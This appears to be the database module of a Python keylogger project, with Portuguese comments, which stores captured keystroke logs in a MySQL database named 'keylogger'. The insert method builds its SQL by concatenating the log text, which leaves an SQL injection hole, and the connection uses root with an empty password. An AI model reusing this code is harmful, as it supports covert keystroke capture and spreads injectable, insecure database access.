import pymysql

class Database:

    def __init__(self):
        # Abrimos uma conexão com o banco de dados:
        self.conexao = pymysql.connect(db='keylogger', user='root', passwd='')
        
        # Cria um cursor:
        self.cursor = self.conexao.cursor()
    
    def insert(self, log):
        # Executa o comando:
        self.cursor.execute("INSERT INTO dados (texto) VALUES ('" + log + "')")
        
        # Efetua um commit no banco de dados.
        # Por padrão, não é efetuado commit automaticamente. Você deve commitar para salvar
        # suas alterações.
        self.conexao.commit()
        
        # Finaliza a conexão
        self.conexao.close()